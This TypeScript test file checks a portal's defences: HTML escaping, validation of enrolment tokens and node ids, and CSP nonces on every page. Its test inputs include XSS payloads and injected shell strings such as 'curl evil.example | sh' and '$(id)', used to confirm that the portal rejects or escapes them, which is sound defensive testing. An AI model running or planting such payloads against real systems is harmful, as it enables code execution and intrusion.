import Fastify from "fastify";
import vm from "node:vm";
import { describe, expect, it } from "vitest";
import { registerPortalPages } from "../../src/portal/pages/index.js";
import { CLIENT_ESCAPE_JS, displayEnrollmentToken, escapeHtml } from "../../src/portal/pages/escape.js";
import { registerAccountApiRoutes } from "../../src/portal/routes/account.js";
import { registerPortalSecurity } from "../../src/portal/security.js";
import { CSP_NONCE } from "../../src/portal/csp-nonce.js";

const EVIL = `<img src=x onerror="alert(1)">'"\`&`;
const MAC_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)";

async function pagesApp(withSecurity = false) {
  const app = Fastify();
  if (withSecurity) await registerPortalSecurity(app, { publicOrigin: "https://edgecoder.io", trustedOrigins: [] });
  registerPortalPages(app);
  await app.ready();
  return app;
}

describe("escapeHtml", () => {
  it("escapes markup and quote characters, server and client alike", () => {
    expect(escapeHtml(EVIL)).toBe("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&#39;&quot;&#96;&amp;");
    expect(escapeHtml(undefined)).toBe("");
    expect(escapeHtml(0)).toBe("0");
    const ctx = vm.createContext({});
    vm.runInContext(CLIENT_ESCAPE_JS, ctx);
    expect(vm.runInContext(`escapeHtml(${JSON.stringify(EVIL)})`, ctx)).toBe(escapeHtml(EVIL));
  });
});

describe("Settings > Install agent token (was /portal/download)", () => {
  const TOKEN = "a".repeat(32) + "0123456789abcdef0123456789abcdef";

  it("shows a well-formed enrolment token in the install commands", async () => {
    const app = await pagesApp();
    const res = await app.inject({ url: `/portal/settings/install?token=${TOKEN}`, headers: { "user-agent": MAC_UA } });
    expect(res.statusCode).toBe(200);
    expect(res.body).toContain(`--token ${TOKEN}`);
    await app.close();
  });

  it("links only to things that exist: no unpublished Docker image, no Linux desktop package", async () => {
    const app = await pagesApp();
    const linuxUa = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0";
    const res = await app.inject({ url: `/portal/settings/install?token=${TOKEN}`, headers: { "user-agent": linuxUa } });
    expect(res.statusCode).toBe(200);
    expect(res.body).not.toContain("ghcr.io");
    expect(res.body).not.toContain("EdgeCoder_amd64.deb");
    expect(res.body).not.toContain("EdgeCoder_amd64.AppImage");
    // The Linux card is the signed one-line installer, with the token filled in.
    expect(res.body).toMatch(/id="linux-install"><code>curl -fsSLo install\.sh [^<]*\/install\.sh && sudo bash install\.sh --token /);
    await app.close();
  });

  it.each([
    `<script>alert(1)</script>`,
    `x'); alert(1); ('`,
    `abc; curl evil.example | sh`,
    `$(id)`,
    `${"a".repeat(63)}"`,
    TOKEN + "<b>",
  ])("falls back to the placeholder for %s", async (bad) => {
    const app = await pagesApp();
    const res = await app.inject({ url: `/portal/settings/install?token=${encodeURIComponent(bad)}`, headers: { "user-agent": MAC_UA } });
    expect(res.statusCode).toBe(200);
    expect(res.body).not.toContain(bad);
    expect(res.body).toContain("--token YOUR_TOKEN");
    expect(res.body).not.toContain("<script>alert");
    expect(res.body).not.toContain("alert(1)");
    await app.close();
  });

  it("validates against the enrolment token format", () => {
    expect(displayEnrollmentToken(TOKEN)).toBe(TOKEN);
    expect(displayEnrollmentToken(` ${TOKEN} `)).toBe(TOKEN);
    expect(displayEnrollmentToken(TOKEN.slice(1))).toBe("YOUR_TOKEN");
    expect(displayEnrollmentToken(["a"])).toBe("YOUR_TOKEN");
    expect(displayEnrollmentToken(undefined)).toBe("YOUR_TOKEN");
  });
});

/* ── A tiny fake browser: enough DOM for the page scripts to render their tables ── */
type FakeEl = Record<string, any>;
function fakeElement(): FakeEl {
  const el: FakeEl = {
    innerHTML: "", textContent: "", className: "", value: "", hidden: false, disabled: false,
    style: { setProperty() {} }, dataset: {}, options: [], scrollTop: 0, scrollHeight: 0,
    classList: { add() {}, remove() {}, toggle() {}, contains: () => false },
    addEventListener() {}, removeEventListener() {}, setAttribute() {}, getAttribute: () => null, removeAttribute() {},
    querySelector: () => fakeElement(), querySelectorAll: () => [], appendChild: (c: unknown) => c, append() {}, remove() {},
    focus() {}, click() {}, contains: () => false, insertAdjacentHTML() {}, closest: () => null,
  };
  el.parentElement = el;
  return el;
}

async function runPage(html: string, responses: Record<string, unknown>) {
  const scripts = [...html.matchAll(/<script nonce="[^"]*">([\s\S]*?)<\/script>/g)].map((m) => m[1]);
  expect(scripts.length).toBeGreaterThan(0);
  const els = new Map<string, FakeEl>();
  const document = {
    getElementById: (id: string) => {
      // Status filters start on "all", as the pages' <select>s do.
      if (!els.has(id)) els.set(id, Object.assign(fakeElement(), /StatusFilter$/.test(id) ? { value: "all" } : {}));
      return els.get(id);
    },
    querySelector: () => fakeElement(), querySelectorAll: () => [], addEventListener() {},
    createElement: () => fakeElement(), createTextNode: (t: string) => ({ textContent: t }),
    documentElement: fakeElement(), head: fakeElement(), body: fakeElement(),
  };
  const fetch = async (path: string) => {
    const key = Object.keys(responses).find((k) => path === k || path.startsWith(k + "?"));
    const data = key ? responses[key] : {};
    return { ok: Boolean(key), status: key ? 200 : 404, json: async () => data };
  };
  const ctx: Record<string, unknown> = {
    document, fetch, console, setTimeout: () => 0, clearTimeout() {}, setInterval: () => 0, clearInterval() {},
    location: { href: "", hash: "", search: "", pathname: "/", origin: "https://edgecoder.io" },
    history: { replaceState() {} }, navigator: { clipboard: { writeText: async () => {} } },
    localStorage: { getItem: () => null, setItem() {} }, getComputedStyle: () => ({ getPropertyValue: () => "" }),
    confirm: () => false, alert() {}, addEventListener() {}, scrollTo() {},
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  for (const s of scripts) vm.runInContext(s, ctx);
  for (let i = 0; i < 20; i++) await new Promise((r) => setImmediate(r));
  return els;
}

function expectEscaped(markup: string) {
  expect(markup).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
  expect(markup).not.toContain("<img");
}

const ADMIN_ME = { user: { userId: "u1", email: "admin@x.io", emailVerified: true, roles: { isSystemAdmin: true, isCoordinatorAdmin: true } } };
const EVIL_NODE = { nodeId: EVIL, nodeKind: EVIL, ownerEmail: EVIL, sourceIp: EVIL, countryCode: EVIL, emailVerified: true, active: true };

describe("pages escape node ids and other user or agent data", () => {
  it("admin settings: pending and approved nodes, users", async () => {
    const app = await pagesApp();
    const html = (await app.inject({ url: "/portal/settings/admin" })).body;
    const els = await runPage(html, {
      "/me": ADMIN_ME,
      "/coordinator/ops/summary": { pendingNodes: [EVIL_NODE], approvedNodes: [EVIL_NODE], access: { canManageApprovals: true } },
      "/portal/api/admin/users": { users: [{ userId: EVIL, email: EVIL, role: EVIL, emailVerified: false }] },
    });
    expectEscaped(els.get("opsPendingBody")!.innerHTML);
    expectEscaped(els.get("opsApprovedBody")!.innerHTML);
    expectEscaped(els.get("userMgmtBody")!.innerHTML);
    await app.close();
  });

  it("settings nodes page", async () => {
    const app = await pagesApp();
    const html = (await app.inject({ url: "/portal/settings/nodes" })).body;
    const els = await runPage(html, { "/me": ADMIN_ME, "/dashboard/summary": { nodes: [EVIL_NODE] } });
    expectEscaped(els.get("nodesBody")!.innerHTML);
    await app.close();
  });

  it("dashboard: model mesh agents and issuance allocations", async () => {
    const app = await pagesApp();
    const html = (await app.inject({ url: "/portal/dashboard" })).body;
    const els = await runPage(html, {
      "/me": ADMIN_ME,
      "/dashboard/summary": { walletSnapshot: { creditHistory: [{ type: "earn", reason: EVIL, credits: EVIL, createdAtMs: 1 }] }, nodes: [] },
      "/dashboard/network-insights": {
        issuance: { epoch: { dailyPoolTokens: 1, loadIndex: 1, contributionCount: 1 }, allocations: [{ accountId: EVIL }] },
        modelMesh: { models: [{ agentId: EVIL, provider: EVIL, modelCatalog: [EVIL], maxConcurrentTasks: EVIL }] },
      },
      "/dashboard/network-status": { coordinatorOnline: true, agents: 1 },
    });
    expectEscaped(els.get("modelMeshBody")!.innerHTML);
    expectEscaped(els.get("issuanceAllocBody")!.innerHTML);
    expectEscaped(els.get("activityFeed")!.innerHTML);
    await app.close();
  });

  it("Settings > Plan & usage (the wallet): payouts, send requests and credit history", async () => {
    const app = await pagesApp();
    const html = (await app.inject({ url: "/portal/settings/plan" })).body;
    const els = await runPage(html, {
      "/me": ADMIN_ME,
      "/wallet/payouts": { balance: {}, policy: {}, payouts: [{ kind: EVIL, status: EVIL, error: EVIL, amountMsat: 1, feeMsat: 1 }] },
      "/wallet/send/requests": { requests: [{ destination: EVIL, amountSats: EVIL, status: EVIL, requestId: EVIL }] },
      "/dashboard/summary": {
        user: { userId: "u1" },
        walletSnapshot: { creditHistory: [{ type: EVIL, credits: EVIL, reason: EVIL }], wallets: [{ walletType: EVIL, payoutAddress: EVIL }], paymentIntents: [{ intentId: EVIL, status: EVIL }] },
      },
    });
    expectEscaped(els.get("payoutsBody")!.innerHTML);
    expectEscaped(els.get("sendRequestsBody")!.innerHTML);
    expectEscaped(els.get("creditHistoryBody")!.innerHTML);
    expectEscaped(els.get("walletsBody")!.innerHTML);
    await app.close();
  });
});

describe("POST /nodes/enroll node id validation", () => {
  const setup = () => {
    const user = { userId: "u1", email: "a@x.io", emailVerified: false };
    const stored: string[] = [];
    const app = Fastify();
    registerAccountApiRoutes(app, {
      store: {
        getNodeEnrollment: async () => null,
        getNodeEnrollmentByDeviceId: async () => null,
        upsertNodeEnrollment: async (r: any) => { stored.push(r.nodeId); return { ...r, nodeApproved: false, active: false }; },
        setNodeApproval: async () => null,
        getNodeEnrollment: async () => null,
        getNodeEnrollmentByDeviceId: async () => null,
      },
      getCurrentUser: async () => user,
      sha256Hex: (s: string) => `h(${s})`,
      deriveIosDeviceIdFromNodeId: () => undefined,
    } as never);
    return { app, stored };
  };
  const enroll = (app: ReturnType<typeof Fastify>, nodeId: unknown) =>
    app.inject({ method: "POST", url: "/nodes/enroll", payload: { nodeId, nodeKind: "agent" } });

  it.each([EVIL, "ab", "a".repeat(129), "node id", "node/1", "node;rm", "nödé", "x\ny"])("rejects %j", async (bad) => {
    const { app, stored } = setup();
    const res = await enroll(app, bad);
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toBe("invalid_node_id");
    expect(stored).toEqual([]);
  });

  it.each(["box-gpu0", "Codys-MacBook-Pro.local", "ios-3f2a9c1e", "worker_1", "a".repeat(128)])("accepts %s", async (ok) => {
    const { app, stored } = setup();
    const res = await enroll(app, ok);
    expect(res.statusCode).toBe(200);
    expect(stored).toEqual([ok]);
  });
});

describe("enforced CSP with per-request script nonces", () => {
  const PAGES = [
    "/portal", "/portal-legacy", "/portal/reset-password", "/portal/chat", "/portal/dashboard", "/portal/settings/plan",
    "/portal/settings", "/portal/settings/nodes", "/portal/settings/admin", "/portal/settings/install", "/portal/reviews", "/portal/settings/compute",
    "/", "/privacy", "/terms",
  ];

  it("enforces the policy by default, with a fresh nonce per response", async () => {
    const app = await pagesApp(true);
    const a = await app.inject({ url: "/portal/dashboard" });
    const b = await app.inject({ url: "/portal/dashboard" });
    expect(a.headers["content-security-policy-report-only"]).toBeUndefined();
    const csp = String(a.headers["content-security-policy"]);
    expect(csp).toMatch(/script-src 'self' 'nonce-[A-Za-z0-9+/=]{20,}'/);
    expect(csp).toContain("script-src-attr 'none'");
    expect(csp).toContain("upgrade-insecure-requests");
    expect(csp).not.toContain("unsafe-inline' 'nonce"); // style-src keeps unsafe-inline without a nonce
    const nonceA = csp.match(/'nonce-([^']+)'/)![1];
    const nonceB = String(b.headers["content-security-policy"]).match(/'nonce-([^']+)'/)![1];
    expect(nonceA).not.toBe(nonceB);
    await app.close();
  });

  it("every inline script on every page carries the response's nonce; no inline handlers", async () => {
    const app = await pagesApp(true);
    for (const url of PAGES) {
      const res = await app.inject({ url, headers: { "user-agent": MAC_UA } });
      expect(res.statusCode, url).toBe(200);
      const csp = String(res.headers["content-security-policy"]);
      const nonce = csp.match(/'nonce-([^']+)'/)?.[1];
      expect(nonce, url).toBeTruthy();
      expect(res.body, url).not.toContain(CSP_NONCE);
      const tags = [...res.body.matchAll(/<script\b[^>]*>/g)].map((m) => m[0]);
      for (const tag of tags) expect(tag, url).toBe(`<script nonce="${nonce}">`);
      // And each one still parses (the handler rewrites didn't break the page scripts).
      for (const m of res.body.matchAll(/<script nonce="[^"]*">([\s\S]*?)<\/script>/g)) expect(() => new vm.Script(m[1]), url).not.toThrow();
      expect(res.body, url).not.toMatch(/<[^>]+\son[a-z]+\s*=/i);
      expect(res.body, url).not.toMatch(/\son(click|change|input|submit|load|error)=\\?["']/);
    }
    await app.close();
  });

  it("can still be switched to report-only", async () => {
    const app = Fastify();
    await registerPortalSecurity(app, { publicOrigin: "http://127.0.0.1:4310", trustedOrigins: [], enforceCsp: false });
    registerPortalPages(app);
    const res = await app.inject({ url: "/portal/dashboard" });
    expect(res.headers["content-security-policy"]).toBeUndefined();
    expect(String(res.headers["content-security-policy-report-only"])).toContain("'nonce-");
    expect(String(res.headers["content-security-policy-report-only"])).not.toContain("upgrade-insecure-requests");
    await app.close();
  });
});
